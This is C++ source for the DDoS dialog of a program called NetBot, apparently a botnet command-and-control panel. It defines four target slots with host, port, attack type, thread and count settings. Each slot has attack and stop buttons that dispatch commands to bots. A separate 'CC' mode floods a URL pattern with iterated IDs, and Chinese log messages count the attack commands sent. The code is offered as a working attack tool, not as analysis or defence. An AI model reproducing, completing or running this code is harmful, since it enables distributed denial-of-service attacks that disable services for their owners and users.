// DDosDlg.cpp : implementation file
//

#include "stdafx.h"
#include "NetBot.h"
#include "DDosDlg.h"
#include "NetBotDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CDDosDlg dialog


CDDosDlg::CDDosDlg(CWnd* pParent /*=NULL*/)
    : CDialog(CDDosDlg::IDD, pParent)
{
    m_IP1 = _T("www.target1.com");
    m_IP2 = _T("www.target2.com");
    m_IP3 = _T("www.target3.com");
    m_IP4 = _T("www.target4.com");
    m_Port1 = 80;
    m_Port2 = 80;
    m_Port3 = 80;
    m_Port4 = 80;
    m_Type1 = 2;//-1,0,1,2,3
    m_Type2 = 2;
    m_Type3 = 2;
    m_Type4 = 2;//-1,0,1,2,3
    m_Num1 = 100;
    m_Num2 = 100;
    m_Num3 = 100;
    m_Num4 = 100;
    m_Thread1 = 10;
    m_Thread2 = 10;
    m_Thread3 = 10;
    m_Thread4 = 10;
    m_IP = _T("http://www.target.com/show.asp?id=123");
    m_Type  = 7;
    m_Port  = 80;
    m_Thread  = 10;
    m_bUseSelect = FALSE;
    m_bAutoAttack = FALSE;
    m_Num = 100;
    m_CCUrl = _T("http://www.target.com/showlist.asp?id=%d");
    m_CCThread = 10;
    m_CCPort = 80;
    m_CCNum = 100;
    m_CCParamX = 11;
    m_CCParamY = 132;
    m_bCCUseSel = FALSE;
}


void CDDosDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    DDX_Control(pDX, IDC_LIST_LOG, m_LogList);
    DDX_Text(pDX, IDC_EDIT_IP1, m_IP1);
    DDV_MaxChars(pDX, m_IP1, 100);
    DDX_Text(pDX, IDC_EDIT_IP2, m_IP2);
    DDV_MaxChars(pDX, m_IP2, 100);
    DDX_Text(pDX, IDC_EDIT_IP3, m_IP3);
    DDV_MaxChars(pDX, m_IP3, 100);
    DDX_Text(pDX, IDC_EDIT_IP4, m_IP4);
    DDV_MaxChars(pDX, m_IP4, 100);
    DDX_Text(pDX, IDC_EDIT_PORT1, m_Port1);
    DDV_MinMaxInt(pDX, m_Port1, 0, 65500);
    DDX_Text(pDX, IDC_EDIT_PORT2, m_Port2);
    DDV_MinMaxInt(pDX, m_Port2, 0, 65500);
    DDX_Text(pDX, IDC_EDIT_PORT3, m_Port3);
    DDV_MinMaxInt(pDX, m_Port3, 0, 65500);
    DDX_Text(pDX, IDC_EDIT_PORT4, m_Port4);
    DDV_MinMaxInt(pDX, m_Port4, 0, 65500);
    DDX_CBIndex(pDX, IDC_COMBO_TYPE1, m_Type1);
    DDX_CBIndex(pDX, IDC_COMBO_TYPE2, m_Type2);
    DDX_CBIndex(pDX, IDC_COMBO_TYPE3, m_Type3);
    DDX_CBIndex(pDX, IDC_COMBO_TYPE4, m_Type4);
    DDX_Text(pDX, IDC_EDIT_NUM1, m_Num1);
    DDV_MinMaxInt(pDX, m_Num1, 1, 65500);
    DDX_Text(pDX, IDC_EDIT_NUM2, m_Num2);
    DDV_MinMaxInt(pDX, m_Num2, 1, 65500);
    DDX_Text(pDX, IDC_EDIT_NUM3, m_Num3);
    DDV_MinMaxInt(pDX, m_Num3, 1, 65500);
    DDX_Text(pDX, IDC_EDIT_NUM4, m_Num4);
    DDV_MinMaxInt(pDX, m_Num4, 1, 65500);
    DDX_Text(pDX, IDC_EDIT_THREAD1, m_Thread1);
    DDV_MinMaxInt(pDX, m_Thread1, 1, 50);
    DDX_Text(pDX, IDC_EDIT_THREAD2, m_Thread2);
    DDV_MinMaxInt(pDX, m_Thread2, 1, 50);
    DDX_Text(pDX, IDC_EDIT_THREAD3, m_Thread3);
    DDV_MinMaxInt(pDX, m_Thread3, 1, 50);
    DDX_Text(pDX, IDC_EDIT_THREAD4, m_Thread4);
    DDV_MinMaxInt(pDX, m_Thread4, 1, 50);
    DDX_Text(pDX, IDC_EDIT_IP, m_IP);
    DDV_MaxChars(pDX, m_IP, 200);
    DDX_CBIndex(pDX, IDC_COMBO_TYPE, m_Type);
    DDX_Text(pDX, IDC_EDIT_PORT, m_Port);
    DDV_MinMaxInt(pDX, m_Port, 0, 65500);
    DDX_Text(pDX, IDC_EDIT_THREAD, m_Thread);
    DDV_MinMaxInt(pDX, m_Thread, 1, 50);
    DDX_Check(pDX, IDC_CHECK_USESELECT, m_bUseSelect);
    DDX_Check(pDX, IDC_CHECK_AUTOATTACK, m_bAutoAttack);
    DDX_Text(pDX, IDC_EDIT_NUM, m_Num);
    DDX_Text(pDX, IDC_EDIT_CC_URL, m_CCUrl);
    DDV_MaxChars(pDX, m_CCUrl, 200);
    DDX_Text(pDX, IDC_EDIT_CC_THREAD, m_CCThread);
    DDV_MinMaxUInt(pDX, m_CCThread, 0, 50);
    DDX_Text(pDX, IDC_EDIT_CC_PORT, m_CCPort);
    DDV_MinMaxUInt(pDX, m_CCPort, 0, 65535);
    DDX_Text(pDX, IDC_EDIT_CC_NUM, m_CCNum);
    DDV_MinMaxUInt(pDX, m_CCNum, 0, 10000);
    DDX_Text(pDX, IDC_EDIT_CC_PARAMX, m_CCParamX);
    DDX_Text(pDX, IDC_EDIT_CC_PARAMY, m_CCParamY);
    DDX_Check(pDX, IDC_CHECK_CC_USESEL, m_bCCUseSel);
}


BEGIN_MESSAGE_MAP(CDDosDlg, CDialog)
    ON_BN_CLICKED(IDC_BTN_ATTACK1, OnBtnAttack1)
    ON_BN_CLICKED(IDC_BTN_STOP1, OnBtnStop1)
    ON_BN_CLICKED(IDC_BTN_ATTACK2, OnBtnAttack2)
    ON_BN_CLICKED(IDC_BTN_STOP2, OnBtnStop2)
    ON_BN_CLICKED(IDC_BTN_ATTACK3, OnBtnAttack3)
    ON_BN_CLICKED(IDC_BTN_STOP3, OnBtnStop3)
    ON_BN_CLICKED(IDC_BTN_ATTACK4, OnBtnAttack4)
    ON_BN_CLICKED(IDC_BTN_STOP4, OnBtnStop4)
    ON_BN_CLICKED(IDC_BTN_ATTACK, OnBtnAttack)
    ON_BN_CLICKED(IDC_BTN_STOP, OnBtnStop)
    ON_BN_CLICKED(IDC_BTN_CC_ATTACK, OnBtnCcAttack)
    ON_BN_CLICKED(IDC_BTN_CC_STOP, OnBtnCcStop)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDDosDlg message handlers
BOOL CDDosDlg::OnInitDialog()
{
    CDialog::OnInitDialog();

    // TODO: Add extra initialization here
    GetDlgItem(IDC_BTN_STOP)->EnableWindow(FALSE);
    GetDlgItem(IDC_BTN_STOP1)->EnableWindow(FALSE);
    GetDlgItem(IDC_BTN_STOP2)->EnableWindow(FALSE);
    GetDlgItem(IDC_BTN_STOP3)->EnableWindow(FALSE);
    GetDlgItem(IDC_BTN_STOP4)->EnableWindow(FALSE);
    GetDlgItem(IDC_BTN_CC_STOP)->EnableWindow(FALSE);

    ((CSpinButtonCtrl *)GetDlgItem(IDC_SPIN_THREAD ))->SetRange(1, 50);
    ((CSpinButtonCtrl *)GetDlgItem(IDC_SPIN_THREAD1))->SetRange(1, 50);
    ((CSpinButtonCtrl *)GetDlgItem(IDC_SPIN_THREAD2))->SetRange(1, 50);
    ((CSpinButtonCtrl *)GetDlgItem(IDC_SPIN_THREAD3))->SetRange(1, 50);
    ((CSpinButtonCtrl *)GetDlgItem(IDC_SPIN_THREAD4))->SetRange(1, 50);
    ((CSpinButtonCtrl *)GetDlgItem(IDC_SPIN_CC_THREAD))->SetRange(1, 50);

    ((CSpinButtonCtrl *)GetDlgItem(IDC_SPIN_NUM ))->SetRange(1, 10000);
    ((CSpinButtonCtrl *)GetDlgItem(IDC_SPIN_NUM1))->SetRange(1, 10000);
    ((CSpinButtonCtrl *)GetDlgItem(IDC_SPIN_NUM2))->SetRange(1, 10000);
    ((CSpinButtonCtrl *)GetDlgItem(IDC_SPIN_NUM3))->SetRange(1, 10000);
    ((CSpinButtonCtrl *)GetDlgItem(IDC_SPIN_NUM4))->SetRange(1, 10000);
    ((CSpinButtonCtrl *)GetDlgItem(IDC_SPIN_CC_NUM))->SetRange(1, 10000);

    return TRUE;
}

BOOL CDDosDlg::PreTranslateMessage(MSG* pMsg)
{
    // TODO: Add your specialized code here and/or call the base class
    if (pMsg->message == WM_KEYDOWN) {
        int nVirtKey = (int)pMsg->wParam;
        if (nVirtKey == VK_RETURN) {
            //如果是回车在这里做你要做的事情,或者什么也不作
            return TRUE;
        }
        if (nVirtKey == VK_ESCAPE) {
            //如果是ESC在这里做你要做的事情,或者什么也不作
            return TRUE;
        }
    }

    return CDialog::PreTranslateMessage(pMsg);
}

void CDDosDlg::OnBtnAttack()
{
    // TODO: Add your control notification handler code here
    UpdateData(TRUE);
    if (m_IP.GetLength() < 3 || m_IP.GetLength() > 100)
        return;
    if (m_Port <0 || m_Port >65500)
        return;
    if (m_Thread <1 || m_Thread >100)
        return;
    if (m_Num <1 || m_Num >10000)
        return;

    GetDlgItem(IDC_BTN_ATTACK)->EnableWindow(FALSE);
    GetDlgItem(IDC_BTN_STOP)->EnableWindow(TRUE);

    if (m_bUseSelect)
        m_Num = -1;

    int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackTask(0, m_IP, m_Port, m_Type+1, m_Thread, m_Num,m_bAutoAttack);
    //output message
    CString Msg;
    Msg.Format(">>>>成功发送%d条[攻击]命令",iRet);
    m_LogList.InsertString(0,Msg);
}

void CDDosDlg::OnBtnStop()
{
    // TODO: Add your control notification handler code here
    int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackStop(0);
    //output message
    CString Msg;
    Msg.Format("<<<<成功发送%d条[停止]命令",iRet);
    m_LogList.InsertString(0,Msg);

    GetDlgItem(IDC_BTN_ATTACK)->EnableWindow(TRUE);
    GetDlgItem(IDC_BTN_STOP)->EnableWindow(FALSE);
}

void CDDosDlg::OnBtnAttack1()
{
    // TODO: Add your control notification handler code here
    UpdateData(TRUE);
    if (m_IP1.GetLength() < 3 || m_IP1.GetLength() > 100)
        return;
    if (m_Port1 <0 || m_Port1 >65500)
        return;
    if (m_Thread1 <1 || m_Thread1 >100)
        return;
    if (m_Num1 <1 || m_Num1 >10000)
        return;

    GetDlgItem(IDC_BTN_ATTACK1)->EnableWindow(FALSE);
    GetDlgItem(IDC_BTN_STOP1)->EnableWindow(TRUE);

    int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackTask(1, m_IP1, m_Port1, m_Type1+1, m_Thread1, m_Num1);
    //output message
    CString Msg;
    Msg.Format(">>>>成功发送%d条[攻击]命令",iRet);
    m_LogList.InsertString(0,Msg);
}

void CDDosDlg::OnBtnStop1()
{
    // TODO: Add your control notification handler code here
    int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackStop(1);
    //output message
    CString Msg;
    Msg.Format("<<<<成功发送%d条[停止]命令",iRet);
    m_LogList.InsertString(0,Msg);

    GetDlgItem(IDC_BTN_ATTACK1)->EnableWindow(TRUE);
    GetDlgItem(IDC_BTN_STOP1)->EnableWindow(FALSE);
}

void CDDosDlg::OnBtnAttack2()
{
    // TODO: Add your control notification handler code here
    UpdateData(TRUE);
    if (m_IP2.GetLength() < 3 || m_IP2.GetLength() > 100)
        return;
    if (m_Port2 <0 || m_Port2 >65500)
        return;
    if (m_Thread2 <1 || m_Thread2 >100)
        return;
    if (m_Num2 <1 || m_Num2 >10000)
        return;

    GetDlgItem(IDC_BTN_ATTACK2)->EnableWindow(FALSE);
    GetDlgItem(IDC_BTN_STOP2)->EnableWindow(TRUE);

    int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackTask(2, m_IP2, m_Port2, m_Type2+1, m_Thread2, m_Num2);
    //output message
    CString Msg;
    Msg.Format(">>>>成功发送%d条[攻击]命令",iRet);
    m_LogList.InsertString(0,Msg);
}

void CDDosDlg::OnBtnStop2()
{
    // TODO: Add your control notification handler code here
    int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackStop(2);
    //output message
    CString Msg;
    Msg.Format("<<<<成功发送%d条[停止]命令",iRet);
    m_LogList.InsertString(0,Msg);

    GetDlgItem(IDC_BTN_ATTACK2)->EnableWindow(TRUE);
    GetDlgItem(IDC_BTN_STOP2)->EnableWindow(FALSE);
}

void CDDosDlg::OnBtnAttack3()
{
    // TODO: Add your control notification handler code here
    UpdateData(TRUE);
    if (m_IP3.GetLength() < 3 || m_IP3.GetLength() > 100)
        return;
    if (m_Port3 <0 || m_Port3 >65500)
        return;
    if (m_Thread3 <1 || m_Thread3 >100)
        return;
    if (m_Num3 <1 || m_Num3 >10000)
        return;

    GetDlgItem(IDC_BTN_ATTACK3)->EnableWindow(FALSE);
    GetDlgItem(IDC_BTN_STOP3)->EnableWindow(TRUE);

    int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackTask(3, m_IP3, m_Port3, m_Type3+1, m_Thread3, m_Num3);
    //output message
    CString Msg;
    Msg.Format(">>>>成功发送%d条[攻击]命令",iRet);
    m_LogList.InsertString(0,Msg);
}

void CDDosDlg::OnBtnStop3()
{
    // TODO: Add your control notification handler code here
    int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackStop(3);
    //output message
    CString Msg;
    Msg.Format("<<<<成功发送%d条[停止]命令",iRet);
    m_LogList.InsertString(0,Msg);

    GetDlgItem(IDC_BTN_ATTACK3)->EnableWindow(TRUE);
    GetDlgItem(IDC_BTN_STOP3)->EnableWindow(FALSE);
}

void CDDosDlg::OnBtnAttack4()
{
    // TODO: Add your control notification handler code here
    UpdateData(TRUE);
    if (m_IP4.GetLength() < 3 || m_IP4.GetLength() > 100)
        return;
    if (m_Port4 <0 || m_Port4 >65500)
        return;
    if (m_Thread4 <1 || m_Thread4 >100)
        return;
    if (m_Num4 <1 || m_Num4 >10000)
        return;

    GetDlgItem(IDC_BTN_ATTACK4)->EnableWindow(FALSE);
    GetDlgItem(IDC_BTN_STOP4)->EnableWindow(TRUE);

    int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackTask(4, m_IP4, m_Port4, m_Type4+1, m_Thread4, m_Num4);
    //output message
    CString Msg;
    Msg.Format(">>>>成功发送%d条[攻击]命令",iRet);
    m_LogList.InsertString(0,Msg);
}

void CDDosDlg::OnBtnStop4()
{
    // TODO: Add your control notification handler code here
    int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackStop(4);
    //output message
    CString Msg;
    Msg.Format("<<<<成功发送%d条[停止]命令",iRet);
    m_LogList.InsertString(0,Msg);

    GetDlgItem(IDC_BTN_ATTACK4)->EnableWindow(TRUE);
    GetDlgItem(IDC_BTN_STOP4)->EnableWindow(FALSE);
}

void CDDosDlg::OnBtnCcAttack()
{
    // TODO: Add your control notification handler code here
    UpdateData(TRUE);

    if (m_CCUrl.GetLength() < 3 || m_CCUrl.GetLength() > 200)
        return;
    if (m_CCPort <0 || m_CCPort >65535)
        return;
    if (m_CCThread <1 || m_CCThread >100)
        return;
    if (m_CCNum <1 || m_CCNum >10000)
        return;

    GetDlgItem(IDC_BTN_CC_ATTACK)->EnableWindow(FALSE);
    GetDlgItem(IDC_BTN_CC_STOP)->EnableWindow(TRUE);

    if (m_bCCUseSel)
        m_CCNum = -1;

    /////////////////////////////////////////////////////
    //
    if(m_CCParamX > m_CCParamY) {
        int iTemp = m_CCParamY;
        m_CCParamY = m_CCParamX;
        m_CCParamX = iTemp;
    }

    int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackSpiderCC(5,m_CCUrl,m_CCPort,m_CCThread,m_CCNum,m_CCParamX,m_CCParamY);
    //output message
    CString Msg;
    Msg.Format("<<<<成功发送%d条[攻击]命令",iRet);
    m_LogList.InsertString(0,Msg);
}

void CDDosDlg::OnBtnCcStop()
{
    // TODO: Add your control notification handler code here
    int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackStop(5);
    //output message
    CString Msg;
    Msg.Format("<<<<成功发送%d条[停止]命令",iRet);
    m_LogList.InsertString(0,Msg);

    GetDlgItem(IDC_BTN_CC_ATTACK)->EnableWindow(TRUE);
    GetDlgItem(IDC_BTN_CC_STOP)->EnableWindow(FALSE);
}
